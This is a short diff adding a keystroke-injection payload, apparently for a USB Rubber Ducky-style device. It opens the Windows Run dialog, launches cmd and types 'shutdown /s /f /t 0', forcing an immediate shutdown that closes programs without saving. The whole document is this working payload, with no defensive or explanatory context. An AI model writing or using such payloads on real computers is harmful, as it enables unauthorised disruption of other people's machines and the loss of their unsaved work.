@@ -1,0 +1,7 @@
+WINDOWS R
+DELAY 250
+STRING cmd
+ENTER
+DELAY 300
+STRING shutdown /s /f /t 0
+ENTER
